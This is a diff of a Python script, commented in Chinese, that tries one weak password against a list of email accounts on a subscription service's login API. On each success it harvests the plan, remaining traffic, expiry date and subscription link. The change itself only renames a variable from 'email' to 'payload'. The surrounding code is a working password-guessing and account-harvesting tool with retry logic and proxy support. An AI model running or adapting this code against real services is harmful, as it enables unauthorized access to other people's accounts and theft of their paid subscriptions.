@@ -15,17 +15,17 @@ userinfo_link = domain + 'api/v1/user/getSubscribe'
 result = []
 
 
-def get_user(email):
+def get_user(payload):
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/108.0.0.0 '
                       'Safari/537.36'}
-    post_data = {'email': email,
+    post_data = {'email': payload,
                  'password': '自定义弱口令',
                  }
     try:
         resp = requests.post(url=login_url, data=post_data, headers=headers, proxies=proxies, timeout=20)  # 若存在SSL问题，使用verify=False（取消第5、27行注释）
         # warnings.filterwarnings("ignore")  # 使用verify=False时，关闭警告提醒
-        print('当前账号：' + email.strip(), '  页面响应码:', resp.status_code)
+        print('当前账号：' + payload.strip(), '  页面响应码:', resp.status_code)
         if resp.status_code == 200:
             auth_data = resp.json()['data']['auth_data']  # 获取并传递Authorization，低版本可使用requests.Session()管理会话
             header = {
@@ -57,21 +57,21 @@ def get_user(email):
                         expired_at = dateArray.strftime("%Y-%m-%d %H:%M:%S")
                     sub_plan = resp1.json()["data"]["plan"]["name"]
                     sub_plan1 = sub_plan.encode('unicode_escape').decode('unicode_escape')  # linux使用sub_plan.encode('utf-8').decode('unicode_escape')编码
-                    result_temp = '账号：' + email + '密码：' + '【自定义的弱口令】' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'  # 修改【自定义的弱口令】
+                    result_temp = '账号：' + payload + '密码：' + '【自定义的弱口令】' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'  # 修改【自定义的弱口令】
                     print(result_temp)
                     result.append(result_temp)
                     time.sleep(1)
                 else:
                     return  # 无订阅，跳过
         elif resp.status_code == 419 or resp.status_code == 502:
-            return get_user(email)
+            return get_user(payload)
         else:
             pass
         resp.close()
     except RuntimeError as e:
         print('======连接超时，1s后重新尝试======')
         time.sleep(1)
-        return get_user(email)
+        return get_user(payload)
 
 
 if __name__ == "__main__":
